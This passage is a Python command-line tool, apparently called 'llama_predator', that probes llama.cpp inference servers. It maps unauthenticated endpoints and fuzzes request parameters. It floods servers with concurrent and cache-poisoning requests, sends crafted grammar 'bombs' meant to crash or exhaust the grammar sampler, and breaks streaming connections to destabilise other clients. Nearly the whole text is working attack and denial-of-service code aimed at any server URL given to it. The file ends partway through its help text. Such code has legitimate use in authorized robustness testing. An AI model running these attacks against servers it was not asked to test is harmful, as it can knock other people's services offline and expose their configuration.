#!/usr/bin/env python3
"""
llama_predator.py  —  Black-box vulnerability hunter for llama.cpp servers

Modes (--mode):
  recon        Map HTTP surface, fingerprint llama.cpp-specific endpoints
  schema       Probe JSON contract (field presence, type sensitivity, extremes)
  fuzz         Parameter + payload fuzzer
  stress       Concurrency storm
  ghost        Cross-request KV-cache poisoning (poison vs benign)
  determinism  Repeated same-request nondeterminism detector
  order        Order-sensitivity / session-illusion probe
  grammar      llama.cpp BNF grammar bomb (exponential backtrack, OOM, crash)
  streaming    Protocol desync via truncated/dropped connections
  shape        Response schema/contract drift detector
  rot          Long-run time-bomb / latency rot detector
  all          Run everything except rot (which needs --rot-min)

Usage:
  python3 llama_predator.py --url http://10.0.0.42:8080 --mode recon
  python3 llama_predator.py --url http://10.0.0.42:8080 --mode all
  python3 llama_predator.py --url http://10.0.0.42:8080 --mode ghost --cycles 300
  python3 llama_predator.py --url http://10.0.0.42:8080 --mode rot --rot-min 30
  python3 llama_predator.py --url http://10.0.0.42:8080 --mode fuzz --endpoint /completion

Requires:
  pip install requests
"""

import argparse
import concurrent.futures
import csv
import http.client
import json
import os
import random
import socket
import string
import sys
import threading
import time
import urllib.parse
from collections import Counter, defaultdict
from datetime import datetime
from typing import Any, Dict, List, Optional, Tuple

try:
    import requests
    _session = requests.Session()
except ImportError:
    sys.exit("pip install requests")

# ─── GLOBALS (set by CLI) ────────────────────────────────────────────────────

BASE_URL  = "http://127.0.0.1:8080"
TIMEOUT   = 20
OUT_DIR   = "llama-predator-out"

# ─── CANDIDATE PATHS ────────────────────────────────────────────────────────

LLAMA_PATHS = [
    # Standard LLM paths
    "/", "/health", "/props", "/metrics", "/slots",
    "/completion", "/infill",
    "/v1/completions", "/v1/chat/completions", "/v1/models",
    "/v1/embeddings", "/embedding",
    "/tokenize", "/detokenize",
    # Misc
    "/status", "/generate", "/api",
]

# ─── FINDINGS REGISTRY ───────────────────────────────────────────────────────

findings     = []
findings_lock = threading.Lock()

COLORS = {
    "CRIT": "\033[91m",
    "HIGH": "\033[93m",
    "MED":  "\033[96m",
    "INFO": "\033[92m",
    "END":  "\033[0m",
}

def finding(severity: str, title: str, detail: str, evidence: Optional[Dict] = None):
    entry = {
        "ts":       datetime.utcnow().isoformat() + "Z",
        "severity": severity,
        "title":    title,
        "detail":   detail,
        "evidence": evidence or {},
    }
    with findings_lock:
        findings.append(entry)
    c = COLORS.get(severity, "")
    print(f"\n{c}[{severity}]{COLORS['END']} {title}\n  {detail}")


def write_report() -> str:
    os.makedirs(OUT_DIR, exist_ok=True)
    path = os.path.join(OUT_DIR, "findings.json")
    with open(path, "w") as f:
        json.dump(findings, f, indent=2)

    print(f"\n\033[1m═══ FINDINGS SUMMARY ═══\033[0m")
    by_sev: Dict[str, List] = defaultdict(list)
    for f_ in findings:
        by_sev[f_["severity"]].append(f_)
    for sev in ["CRIT", "HIGH", "MED", "INFO"]:
        items = by_sev.get(sev, [])
        if items:
            print(f"\n  {sev} ({len(items)}):")
            for item in items:
                print(f"    • {item['title']}")
    print(f"\n  Full report → {path}")
    return path


# ─── HTTP HELPERS ─────────────────────────────────────────────────────────────

def _url(path: str) -> str:
    return BASE_URL.rstrip("/") + path


def http_get(path: str, timeout: float = TIMEOUT) -> Optional[requests.Response]:
    try:
        return _session.get(_url(path), timeout=timeout)
    except Exception:
        return None


def http_post(path: str, body: Any, stream: bool = False,
              timeout: float = TIMEOUT) -> Optional[requests.Response]:
    try:
        return _session.post(_url(path), json=body, stream=stream, timeout=timeout)
    except Exception:
        return None


def timed_post(path: str, body: Any, timeout: float = TIMEOUT
               ) -> Tuple[Optional[requests.Response], float]:
    t0 = time.perf_counter()
    r  = http_post(path, body, timeout=timeout)
    return r, time.perf_counter() - t0


def rand_text(length: int, weird: bool = False) -> str:
    base = string.ascii_letters + string.digits + " \n"
    extra = "αβγδ你好안녕\x00\x01\xff💀🔥" if weird else ""
    pool = base + extra
    return "".join(random.choice(pool) for _ in range(length))


# ─── SCHEMA HELPERS ──────────────────────────────────────────────────────────

def make_body(endpoint: str, prompt: str, **overrides) -> Dict[str, Any]:
    """Build a request body appropriate for the detected endpoint style."""
    if "chat" in endpoint:
        base = {
            "messages":    [{"role": "user", "content": prompt}],
            "max_tokens":  overrides.pop("n_predict", 64),
            "temperature": 0.7,
        }
    else:
        base = {
            "prompt":      prompt,
            "n_predict":   64,
            "temperature": 0.7,
            "top_p":       0.9,
            "stream":      False,
        }
    base.update(overrides)
    return base


def prompt_key(endpoint: str) -> str:
    return "messages" if "chat" in endpoint else "prompt"


def set_prompt(body: Dict, endpoint: str, text: str) -> Dict:
    b = dict(body)
    if "chat" in endpoint:
        b["messages"] = [{"role": "user", "content": text}]
    else:
        b["prompt"] = text
    return b


# ─── PHASE 1: RECON ──────────────────────────────────────────────────────────

def mode_recon() -> Tuple[str, Dict]:
    """Surface mapping + llama.cpp fingerprint. Returns (best_endpoint, base_body)."""
    print("\n\033[1m═══ PHASE 1: RECON ═══\033[0m")

    probes = [
        ("GET",  None),
        ("POST", None),
        ("POST", {"prompt": "Hello"}),
        ("POST", {"input": "Hello"}),
        ("POST", {"messages": [{"role": "user", "content": "Hello"}]}),
    ]

    hits = []
    for path in LLAMA_PATHS:
        for method, body in probes:
            url = _url(path)
            try:
                t0 = time.time()
                if method == "GET":
                    r = _session.get(url, timeout=5)
                elif body is None:
                    r = _session.post(url, timeout=5)
                else:
                    r = _session.post(url, json=body, timeout=5)
                dt = time.time() - t0

                snippet  = r.text[:200].replace("\n", " ")
                is_json  = "json" in r.headers.get("content-type", "").lower()
                is_llm   = any(w in r.text.lower()
                               for w in ["token", "completion", "content", "model",
                                         "llama", "generated", "choices"])
                non404   = r.status_code != 404

                flags = ""
                if non404:
                    flags += " ← HIT"
                    if is_json:  flags += " [JSON]"
                    if is_llm:   flags += " [LLM]"
                    hits.append((path, method, body, r.status_code, r.text, r.headers))

                if non404:
                    print(f"  {method:4s} {path:35s} {r.status_code:3d} {dt:.2f}s{flags}")
                    print(f"         {snippet[:120]}")
            except Exception:
                pass

    # llama.cpp-specific endpoint checks
    print("\n\033[1m  — llama.cpp fingerprint —\033[0m")

    r = http_get("/props")
    if r and r.status_code == 200:
        try:
            props = r.json()
            finding("HIGH", "/props exposed (unauthenticated)",
                    "Server properties reachable without auth — reveals model name, context size, system prompt",
                    {"props": props})
        except Exception:
            pass

    r = http_get("/slots")
    if r and r.status_code == 200:
        finding("HIGH", "/slots exposed (unauthenticated)",
                "Slot management endpoint reachable — reveals concurrency state, enables slot targeting",
                {"snippet": r.text[:400]})

    r = http_get("/metrics")
    if r and r.status_code == 200:
        finding("MED", "/metrics exposed (unauthenticated)",
                "Prometheus metrics reachable — KV cache stats, model name, context window size",
                {"snippet": r.text[:400]})

    r = http_get("/v1/models")
    if r and r.status_code == 200:
        finding("INFO", "/v1/models exposed",
                "Model listing endpoint reachable without auth",
                {"snippet": r.text[:200]})

    # Pick best endpoint
    endpoint  = "/completion"
    base_body = make_body(endpoint, "2+2=", n_predict=16, temperature=0.0)
    for path, method, body, status, text, headers in hits:
        if status == 200 and method == "POST" and any(
            w in text.lower() for w in ["token", "completion", "generated", "choices"]
        ):
            endpoint  = path
            base_body = make_body(path, "2+2=", n_predict=16, temperature=0.0)
            print(f"\n  Best endpoint candidate: {endpoint}")
            break

    return endpoint, base_body


# ─── PHASE 2: SCHEMA PROBE ───────────────────────────────────────────────────

def mode_schema(endpoint: str, base_body: Dict) -> Tuple[str, Dict]:
    """Probe the JSON contract. Returns refined (endpoint, base_body)."""
    print(f"\n\033[1m═══ PHASE 2: SCHEMA → {endpoint} ═══\033[0m")

    r, lat = timed_post(endpoint, base_body)
    if not r or r.status_code != 200:
        alt = "/v1/chat/completions"
        print(f"  {endpoint} failed — trying {alt}")
        endpoint  = alt
        base_body = make_body(alt, "2+2=", n_predict=16, temperature=0.0)
        r, lat = timed_post(endpoint, base_body)
        if not r or r.status_code != 200:
            print("  Both endpoints failed. Continuing with guessed schema.")
            return endpoint, base_body

    print(f"  Baseline OK [{r.status_code}] {lat:.2f}s — {r.text[:80]}")

    # llama.cpp-specific field probes
    probes = [
        ("seed=42",             {**base_body, "seed": 42}),
        ("seed=-1",             {**base_body, "seed": -1}),
        ("stream=true",         {**base_body, "stream": True}),
        ("cache_prompt=true",   {**base_body, "cache_prompt": True}),
        ("slot_id=0",           {**base_body, "slot_id": 0}),
        ("slot_id=999",         {**base_body, "slot_id": 999}),
        ("n_probs=5",           {**base_body, "n_probs": 5}),
        ("grammar=digits",      {**base_body, "grammar": 'root ::= [0-9]+'}),
        ("stop=[.]",            {**base_body, "stop": ["."]}),
        ("n_predict=-1",        {**base_body, "n_predict": -1}),
        ("n_predict=99999",     {**base_body, "n_predict": 99999}),
        ("temperature=-1",      {**base_body, "temperature": -1.0}),
        ("temperature=999",     {**base_body, "temperature": 999.0}),
        ("top_k=0",             {**base_body, "top_k": 0}),
        ("repeat_penalty=0",    {**base_body, "repeat_penalty": 0.0}),
        ("repeat_penalty=100",  {**base_body, "repeat_penalty": 100.0}),
        ("no prompt field",     {k: v for k, v in base_body.items() if k not in ("prompt","messages")}),
        ("empty prompt",        set_prompt(base_body, endpoint, "")),
        ("null prompt",         {**base_body, "prompt": None}),
    ]

    for label, body in probes:
        r2, lat2 = timed_post(endpoint, body, timeout=25)
        status = r2.status_code if r2 else "ERR"
        snippet = (r2.text[:60].replace("\n", " ") if r2 else "no response")
        anomaly = ""
        if not r2:
            anomaly = " ← CONN RESET"
        elif r2.status_code >= 500:
            anomaly = " ← 5xx"
        elif lat2 > 12:
            anomaly = f" ← SLOW {lat2:.0f}s"
        print(f"  [{status}] {lat2:.2f}s  {label:28s}  {snippet[:55]}{anomaly}")

        if not r2:
            finding("CRIT", f"Crash on: {label}",
                    "Connection error on schema probe — likely server crash",
                    {"body": str(body)[:200]})
        elif r2 and r2.status_code >= 500:
            finding("HIGH", f"500 on: {label}",
                    f"Server error for field variant '{label}'",
                    {"body": str(body)[:200], "response": r2.text[:200]})
        elif lat2 > 12:
            finding("MED", f"Latency spike on: {label}",
                    f"{lat2:.1f}s response for '{label}'",
                    {"body": str(body)[:200]})

    return endpoint, base_body


# ─── PHASE 3: FUZZ ───────────────────────────────────────────────────────────

def mode_fuzz(endpoint: str, base_body: Dict, workers: int = 8, count: int = 300):
    print(f"\n\033[1m═══ PHASE 3: FUZZ ({count} cases, {workers} workers) ═══\033[0m")

    def gen_case() -> Dict:
        b = dict(base_body)
        length = random.choice([0, 1, 50, 500, 5000, 50000])
        b = set_prompt(b, endpoint, rand_text(length, weird=random.random() < 0.4))
        for field, values in [
            # Include None and wrong-type strings — hit validation/coercion paths
            ("n_predict",      [0, -1, 1, 32, 512, 99999, 2**31-1, "a-lot", None]),
            ("temperature",    [0.0, -1.0, 0.0001, 2.0, 100.0, "cold", None]),
            ("top_p",          [0.0, -0.5, 0.5, 1.0, 2.0, "high", None]),
            ("top_k",          [0, -1, 1, 40, 9999, "many", None]),
            ("repeat_penalty", [0.0, -1.0, 1.0, 100.0, "none", None]),
            ("seed",           [-1, 0, 42, 2**31-1, "random", None]),
        ]:
            if random.random() < 0.5:
                b[field] = random.choice(values)
        if random.random() < 0.2:
            b["stream"] = random.choice([True, False, "yes", 123, None])
        return b

    cases    = [gen_case() for _ in range(count)]
    lats, statuses, dangerous = [], Counter(), []

    def probe(body):
        r, lat = timed_post(endpoint, body, timeout=120)
        return (r.status_code if r else None), lat, (r.text[:120] if r else ""), body

    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as ex:
        futs = {ex.submit(probe, c): c for c in cases}
        for fut in concurrent.futures.as_completed(futs):
            status, lat, snippet, body = fut.result()
            statuses[status] += 1
            lats.append(lat)
            # Flag crashes, 5xx, and slow responses (>10s) immediately
            if status is None or status >= 500 or lat > 10.0:
                entry = {"status": status, "lat": lat, "body": str(body)[:200], "resp": snippet}
                dangerous.append(entry)
                label = "CONN" if status is None else str(status)
                slow  = f" SLOW={lat:.1f}s" if lat > 10.0 else ""
                print(f"  [!] {label}{slow}  prompt_len={len(str(body.get('prompt', body.get('messages',''))))}"
                      f"  {snippet[:60]}")

    lats.sort()
    p50 = lats[len(lats) // 2] if lats else 0
    p95 = lats[int(len(lats) * 0.95)] if lats else 0
    print(f"\n  Status distribution: {dict(statuses)}")
    print(f"  Latency — p50: {p50:.2f}s  p95: {p95:.2f}s  max: {lats[-1]:.2f}s")
    print(f"  Dangerous cases (5xx/crash/slow): {len(dangerous)}")

    # Persist dangerous hits for later minimization
    if dangerous:
        os.makedirs(OUT_DIR, exist_ok=True)
        hits_path = os.path.join(OUT_DIR, "fuzz_hits.jsonl")
        with open(hits_path, "w") as f:
            for h in dangerous:
                f.write(json.dumps(h) + "\n")
        print(f"  Saved {len(dangerous)} dangerous cases → {hits_path}")

    for e in dangerous[:5]:
        finding("HIGH" if e["status"] is None else "MED",
                f"Fuzz anomaly: status {e['status']}",
                f"Response: {e['resp']}",
                e)
    if p95 > 30:
        finding("HIGH", "p95 latency DoS surface",
                f"p95={p95:.1f}s — fuzz input space contains DoS-capable payloads")


# ─── PHASE 3b: STRESS ────────────────────────────────────────────────────────

def mode_stress(endpoint: str, base_body: Dict, workers: int = 12, iterations: int = 50):
    print(f"\n\033[1m═══ PHASE 3b: CONCURRENCY STORM ({workers}w × {iterations}i) ═══\033[0m")

    errors  = [0]
    total   = [0]
    lock    = threading.Lock()

    def worker(wid: int):
        for i in range(iterations):
            length = random.choice([10, 100, 1000, 5000, 20000])
            b = set_prompt(dict(base_body), endpoint, rand_text(length))
            b["n_predict"] = random.choice([16, 64, 256, 1024])
            r, lat = timed_post(endpoint, b, timeout=60)
            with lock:
                total[0] += 1
                if not r or r.status_code >= 500:
                    errors[0] += 1
                    if errors[0] <= 5:
                        print(f"  [worker {wid}] ERR status={r.status_code if r else 'CONN'} lat={lat:.1f}s")

    threads = [threading.Thread(target=worker, args=(i,), daemon=True) for i in range(workers)]
    for t in threads: t.start()
    for t in threads: t.join()

    err_rate = errors[0] / max(total[0], 1)
    print(f"\n  Total: {total[0]}  Errors: {errors[0]}  Rate: {err_rate:.1%}")
    if err_rate > 0.10:
        finding("HIGH", "5xx storm under concurrency",
                f"{errors[0]}/{total[0]} ({err_rate:.0%}) requests failed under {workers}-worker concurrent load")


# ─── PHASE 4.1: GHOST STATE ──────────────────────────────────────────────────

def mode_ghost(endpoint: str, base_body: Dict, cycles: int = 300):
    """Cross-request KV-cache poisoning detection."""
    print(f"\n\033[1m══ ATTACK 4.1: GHOST STATE / KV POISON ({cycles} cycles) ══\033[0m")

    probe_body = set_prompt(dict(base_body), endpoint, "2+2=")
    probe_body.update({"temperature": 0.0, "n_predict": 8, "cache_prompt": True})

    baseline_r = http_post(endpoint, probe_body)
    baseline   = baseline_r.text if baseline_r else ""
    print(f"  Baseline probe: {baseline[:60]!r}")

    def poison():
        b = set_prompt(dict(base_body), endpoint, rand_text(random.randint(500, 50000), weird=True))
        b.update({"temperature": random.uniform(0.5, 2.0),
                  "n_predict":   random.randint(64, 512),
                  "cache_prompt": True})
        if random.random() < 0.3:
            b["slot_id"] = 0
        http_post(endpoint, b, timeout=30)

    deviations = []
    lats       = []

    for i in range(cycles):
        for _ in range(4):
            threading.Thread(target=poison, daemon=True).start()
        time.sleep(0.05)

        r, lat = timed_post(endpoint, probe_body)
        lats.append(lat)
        text = r.text if r else ""

        if text != baseline:
            deviations.append({"cycle": i, "lat": lat, "text": text[:80]})
            print(f"  [!] Cycle {i:4d}: probe deviated → {text[:60]!r}")

        if i % 50 == 49:
            avg = sum(lats[-50:]) / 50
            print(f"  Cycle {i+1:4d}  avg_lat={avg:.2f}s  deviations={len(deviations)}")

    if deviations:
        finding("CRIT", "Cross-request ghost state confirmed",
                f"{len(deviations)}/{cycles} probe cycles returned non-baseline output — KV cache contamination",
                {"first": deviations[0], "total": len(deviations)})
    else:
        finding("INFO", "Ghost state: no deviation detected",
                f"{cycles} probe cycles stable against poison load")

    if len(lats) >= 100:
        early = sum(lats[:50]) / 50
        late  = sum(lats[-50:]) / 50
        if late > early * 1.5:
            finding("HIGH", "Probe latency degrades under poison load",
                    f"Early avg {early:.2f}s → late avg {late:.2f}s  ({late/early:.1f}×)")


# ─── PHASE 4.2: DETERMINISM ──────────────────────────────────────────────────

def mode_determinism(endpoint: str, base_body: Dict, rounds: int = 100):
    """Nondeterminism fracture under load."""
    print(f"\n\033[1m══ ATTACK 4.2: DETERMINISM FRACTURE ({rounds} rounds) ══\033[0m")

    det_body = set_prompt(dict(base_body), endpoint, "The capital of France is")
    det_body.update({"temperature": 0.0, "top_p": 1.0, "top_k": 1, "seed": 42, "n_predict": 24})

    print("  Pre-load baseline (5 rounds)...")
    pre = [http_post(endpoint, det_body) for _ in range(5)]
    pre_texts = [r.text if r else "" for r in pre]
    baseline = pre_texts[0]
    stable = all(t == baseline for t in pre_texts)
    print(f"  Pre-load stable: {stable}  [{baseline[:60]!r}]")

    if not stable:
        finding("HIGH", "Nondeterministic without load",
                "Same seed/temp=0 returns different output even before any background load",
                {"outputs": pre_texts[:3]})
        return

    stop = threading.Event()

    def load_worker():
        while not stop.is_set():
            b = set_prompt(dict(base_body), endpoint,
                           rand_text(random.randint(10, 2000), weird=False))
            b["temperature"] = random.uniform(0.0, 1.5)
            http_post(endpoint, b, timeout=20)

    threads = [threading.Thread(target=load_worker, daemon=True) for _ in range(6)]
    for t in threads: t.start()

    breaks = []
    for i in range(rounds):
        r, lat = timed_post(endpoint, det_body)
        text = r.text if r else ""
        if text != baseline:
            breaks.append({"iter": i, "lat": lat, "text": text[:80]})
            print(f"  [!] Break at iter {i}: {text[:60]!r}")

    stop.set()

    if breaks:
        finding("CRIT", "Determinism fracture under load",
                f"{len(breaks)}/{rounds} deterministic requests returned non-baseline output under 6-thread load",
                {"first": breaks[0], "baseline": baseline[:80]})
    else:
        finding("INFO", "Determinism: stable under 6-thread load", f"{rounds} rounds passed")


# ─── PHASE 4.3: ORDER SENSITIVITY ────────────────────────────────────────────

def mode_order(endpoint: str, base_body: Dict):
    """Session illusion / order-dependent answers."""
    print(f"\n\033[1m══ ATTACK 4.3: ORDER SENSITIVITY ══\033[0m")

    prompts = [
        ("A", "What is 5 times 7?"),
        ("B", "What is the chemical symbol for water?"),
        ("C", "What color is the sky on a clear day?"),
    ]
    permutations = [
        ["A","B","C"], ["B","C","A"], ["C","A","B"],
        ["A","C","B"], ["B","A","C"], ["C","B","A"],
    ]
    results: Dict[str, List] = defaultdict(list)

    for perm in permutations:
        perm_label = "→".join(perm)
        for label in perm:
            content = next(c for l, c in prompts if l == label)
            b = set_prompt(dict(base_body), endpoint, content)
            b.update({"temperature": 0.0, "n_predict": 32})
            r = http_post(endpoint, b)
            results[label].append((perm_label, r.text[:80] if r else ""))

    for label, responses in results.items():
        texts = [t for _, t in responses]
        if len(set(texts)) > 1:
            finding("HIGH", f"Order-sensitive: prompt {label}",
                    "Same prompt returns different output depending on request order — KV cache or state leak",
                    {"responses": responses})
            print(f"  [!] Prompt {label} varies across orderings")
        else:
            print(f"  Prompt {label}: stable ✓")


# ─── PHASE 4.4: GRAMMAR BOMB (llama.cpp specific) ────────────────────────────

def mode_grammar(endpoint: str, base_body: Dict):
    """BNF grammar exploit vectors specific to llama.cpp grammar sampler."""
    print(f"\n\033[1m══ ATTACK 4.4: GRAMMAR BOMB (llama.cpp specific) ══\033[0m")

    grammars = [
        # Exponential backtracking — forces sampler to explore huge search space
        ("exp-backtrack",
         'root ::= ("a"? "a"? "a"? "a"? "a"? "a"? "a"? "a"? "a"? "a"? '
         '"a"? "a"? "a"? "a"? "a"? "a"? "a"? "a"? "a"? "a"?) "aaaaaaaaaaaaaaaaaaaa"'),
        # Deep recursion — stack overflow candidate
        ("deep-recurse",
         "root ::= item+\nitem ::= \"x\" item? item? item?"),
        # Huge alternation — parser memory and time cost
        ("huge-alt",
         "root ::= " + " | ".join([f'"choice{i}"' for i in range(500)])),
        # Unsatisfiable — sampler loops forever
        ("impossible",
         'root ::= "XQZJVWNMKPRLSDF"'),
        # Invalid syntax — grammar parser crash
        ("invalid-syntax",
         "root ::= [[[[[unclosed"),
        # Null byte injection
        ("null-byte",
         'root ::= "hello\x00world"'),
        # Empty grammar
        ("empty", ""),
        # Unicode overrun
        ("unicode-bomb",
         'root ::= "' + "漢字" * 1000 + '"'),
    ]

    base = set_prompt(dict(base_body), endpoint, "Write something:")
    base["n_predict"] = 64

    for name, grammar in grammars:
        b = {**base, "grammar": grammar}
        r, lat = timed_post(endpoint, b, timeout=30)
        status = r.status_code if r else "ERR"
        snippet = (r.text[:60].replace("\n"," ") if r else "no response")
        flag = ""
        if not r:            flag = " ← CRASH/CONN RESET"
        elif status >= 500:  flag = " ← 5xx"
        elif lat > 15:       flag = f" ← SLOW ({lat:.0f}s)"
        print(f"  [{status}] {lat:.2f}s  {name:20s}  {snippet[:55]}{flag}")

        if not r:
            finding("CRIT", f"Server crash on grammar: {name}",
                    "Connection reset — likely segfault or OOM in grammar sampler",
                    {"grammar": grammar[:100]})
        elif r and r.status_code >= 500:
            finding("HIGH", f"500 on grammar: {name}",
                    f"Server error for grammar variant '{name}'",
                    {"grammar": grammar[:100], "response": r.text[:200]})
        elif lat > 15:
            finding("HIGH", f"Grammar DoS: {name}",
                    f"{lat:.1f}s — grammar causes computation explosion in sampler",
                    {"grammar": grammar[:100]})


# ─── PHASE 4.5: STREAMING DESYNC ─────────────────────────────────────────────

def mode_streaming(endpoint: str, base_body: Dict):
    """Protocol desync via truncated bodies and abrupt connection drops."""
    print(f"\n\033[1m══ ATTACK 4.5: STREAMING DESYNC ══\033[0m")

    parsed = urllib.parse.urlparse(BASE_URL)
    host   = parsed.hostname
    port   = parsed.port or 80
    chaos_n = 50

    normal_errs  = [0]
    normal_total = [0]
    normal_stop  = threading.Event()

    def normal_worker():
        b = set_prompt(dict(base_body), endpoint, "Hello")
        b["n_predict"] = 8
        while not normal_stop.is_set():
            r = http_post(endpoint, b, timeout=10)
            normal_total[0] += 1
            if not r or r.status_code >= 500:
                normal_errs[0] += 1
            time.sleep(0.1)

    t = threading.Thread(target=normal_worker, daemon=True)
    t.start()

    for i in range(chaos_n):
        try:
            conn = http.client.HTTPConnection(host, port, timeout=5)
            b = set_prompt(dict(base_body), endpoint, rand_text(500))
            b.update({"stream": True, "n_predict": 256})
            body_bytes = json.dumps(b).encode()

            mode = i % 3
            if mode == 0:
                # Truncated body with wrong Content-Length
                conn.putrequest("POST", endpoint)
                conn.putheader("Content-Type", "application/json")
                conn.putheader("Content-Length", str(len(body_bytes)))
                conn.endheaders()
                conn.sock.send(body_bytes[:len(body_bytes)//2])
                time.sleep(0.2)
                conn.close()
            elif mode == 1:
                # Two JSON objects concatenated in one body
                double = body_bytes + b"\n" + body_bytes
                conn.request("POST", endpoint, double, {"Content-Type": "application/json"})
                try: conn.getresponse()
                except Exception: pass
                conn.close()
            else:
                # Read 1 chunk then hard disconnect
                conn.request("POST", endpoint, body_bytes, {"Content-Type": "application/json"})
                resp = conn.getresponse()
                resp.read(32)
                conn.close()
        except Exception:
            pass

        if i % 10 == 9:
            print(f"  Chaos {i+1:3d}/{chaos_n}  normal_errs={normal_errs[0]}/{normal_total[0]}")

    normal_stop.set()
    t.join(timeout=3)

    err_rate = normal_errs[0] / max(normal_total[0], 1)
    print(f"\n  Normal client error rate during chaos: {normal_errs[0]}/{normal_total[0]} ({err_rate:.1%})")
    if err_rate > 0.05:
        finding("HIGH", "Clean clients destabilized by streaming chaos",
                f"{err_rate:.0%} of clean requests failed while chaos clients active — connection pool or state corruption",
                {"normal_errors": normal_errs[0], "normal_total": normal_total[0]})


# ─── PHASE 4.6: SHAPE DRIFT ──────────────────────────────────────────────────

def mode_shape(endpoint: str, base_body: Dict, n: int = 200):
    """Response schema/contract drift detector."""
    print(f"\n\033[1m══ ATTACK 4.6: RESPONSE SHAPE DRIFT ({n} requests) ══\033[0m")

    key_sets = Counter()
    non_json  = 0
    ok_200    = 0

    for _ in range(n):
        length = random.choice([0, 10, 100, 1000, 5000])
        b = set_prompt(dict(base_body), endpoint, rand_text(length, weird=random.random() < 0.2))
        b["n_predict"] = random.choice([8, 64, 256])

        r = http_post(endpoint, b, timeout=20)
        if not r:
            continue

        if r.status_code == 200:
            ok_200 += 1

        try:
            obj = r.json()
            ks  = frozenset(obj.keys())
            key_sets[ks] += 1
        except Exception:
            non_json += 1
            if r.status_code == 200:
                finding("MED", "HTTP 200 with non-JSON body",
                        f"Content-Type: {r.headers.get('content-type','?')!r}  body: {r.text[:80]}")

    total = sum(key_sets.values())
    print(f"\n  non-JSON on 200: {non_json}/{ok_200}  Distinct key-sets:")
    for ks, cnt in key_sets.most_common():
        pct  = cnt / total * 100 if total else 0
        rare = " ← RARE" if pct < 5 else ""
        print(f"    {pct:5.1f}%  {set(ks)}{rare}")
        if pct < 5 and cnt >= 2:
            finding("MED", "Rare response key-set",
                    f"Key-set {set(ks)} appears only {pct:.1f}% of responses — possible schema drift",
                    {"keyset": sorted(ks), "count": cnt, "total": total})

    if non_json > ok_200 * 0.05 and ok_200 > 0:
        finding("HIGH", "High non-JSON rate on HTTP 200",
                f"{non_json}/{ok_200} successful responses not parseable as JSON")


# ─── PHASE 4.7: LONG-RUN ROT ─────────────────────────────────────────────────

def mode_rot(endpoint: str, base_body: Dict, duration_min: int = 30):
    """Time-bomb / long-run degradation detector."""
    print(f"\n\033[1m══ ATTACK 4.7: LONG-RUN ROT ({duration_min} minutes) ══\033[0m")

    os.makedirs(OUT_DIR, exist_ok=True)
    csv_path = os.path.join(OUT_DIR, "rot.csv")

    canon_body = set_prompt(dict(base_body), endpoint, "2+2=")
    canon_body.update({"temperature": 0.0, "n_predict": 8})
    canon_baseline = None

    deadline      = time.time() + duration_min * 60
    window: List  = []
    total         = 0
    errs          = 0
    last_check    = time.time()

    with open(csv_path, "w", newline="") as f:
        w = csv.writer(f)
        w.writerow(["ts", "lat", "status", "resp_len", "error"])

        while time.time() < deadline:
            heavy = (total % 10 == 0)
            b = set_prompt(dict(base_body), endpoint,
                           rand_text(3000 if heavy else 200, weird=heavy))
            b["n_predict"] = 256 if heavy else 64

            r, lat = timed_post(endpoint, b)
            status  = r.status_code if r else 0
            rlen    = len(r.text) if r else 0
            is_err  = 0 if (r and status < 500) else 1

            errs  += is_err
            total += 1
            window.append(lat)
            w.writerow([f"{time.time():.2f}", f"{lat:.3f}", status, rlen, is_err])
            f.flush()

            # Canonical correctness check every 20 requests
            if total % 20 == 0:
                r2 = http_post(endpoint, canon_body)
                text = r2.text if r2 else ""
                if canon_baseline is None:
                    canon_baseline = text
                elif text != canon_baseline:
                    elapsed = (duration_min * 60 - (deadline - time.time())) / 60
                    finding("HIGH", "Canonical answer drifted during rot test",
                            f"'2+2=' answer changed at t+{elapsed:.0f}m",
                            {"baseline": canon_baseline[:60], "current": text[:60]})
                    canon_baseline = text

            # Checkpoint every 30 s
            if time.time() - last_check >= 30:
                w_slice = window[-300:]
                avg = sum(w_slice) / len(w_slice) if w_slice else 0
                mx  = max(w_slice) if w_slice else 0
                elapsed = (duration_min * 60 - (deadline - time.time())) / 60
                print(f"  t+{elapsed:4.0f}m  req={total}  errs={errs}  avg={avg:.2f}s  max={mx:.2f}s")
                last_check = time.time()

                if len(window) >= 200:
                    early  = sum(window[:50]) / 50
                    recent = sum(window[-50:]) / 50
                    if recent > early * 2.0:
                        finding("HIGH", "Latency rot detected",
                                f"Avg latency doubled: {early:.2f}s early → {recent:.2f}s now")

    print(f"\n  Rot test complete. CSV: {csv_path}")


# ─── PHASE 5: MINIMIZE ───────────────────────────────────────────────────────

def mode_minimize(endpoint: str, base_body: Dict, target_status: int = 500):
    """Binary-search the smallest prompt that triggers target_status."""
    print(f"\n\033[1m═══ PHASE 5: MINIMIZE (target: HTTP {target_status}) ═══\033[0m")

    def try_len(n: int) -> int:
        b = set_prompt(dict(base_body), endpoint, "A" * n)
        r = http_post(endpoint, b, timeout=25)
        return r.status_code if r else 0

    lo, hi = 0, 200000
    found  = None
    for _ in range(20):
        mid = (lo + hi) // 2
        s   = try_len(mid)
        print(f"  len={mid:8d}  status={s}")
        if s == target_status:
            found = mid
            hi    = mid
        else:
            lo = mid
        if hi - lo <= 1:
            break

    if found is not None:
        finding("INFO", f"Minimal repro: HTTP {target_status}",
                f"Prompt of {found} chars reliably triggers status {target_status}")
        print(f"\n  Minimal repro → prompt length ≈ {found} chars")
    else:
        print(f"  Could not reproduce {target_status} via prompt-length sweep")


# ─── ORCHESTRATE ALL ─────────────────────────────────────────────────────────

def mode_all(endpoint: str, base_body: Dict, workers: int, cycles: int):
    mode_fuzz(endpoint, base_body, workers=workers)
    mode_stress(endpoint, base_body, workers=workers)
    mode_ghost(endpoint, base_body, cycles=cycles)
    mode_determinism(endpoint, base_body)
    mode_order(endpoint, base_body)
    mode_grammar(endpoint, base_body)
    mode_streaming(endpoint, base_body)
    mode_shape(endpoint, base_body)

    # Minimize if we have 5xx findings
    has_5xx = any("500" in f["title"] or "crash" in f["title"].lower() for f in findings)
    if has_5xx:
        mode_minimize(endpoint, base_body, target_status=500)


# ─── CLI ─────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="llama_predator — black-box llama.cpp vulnerability hunter",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
modes:
  recon         Surface mapping + llama.cpp fingerprint
  schema        JSON contract probe (field presence, types, extremes)
  fuzz          Payload + parameter fuzzer
  stress        Concurrency storm
  ghost         Cross-request KV-cache poisoning (poison vs benign)
  determinism   Repeated same-request nondeterminism detector
  order         Order-sensitivity / session-illusion probe
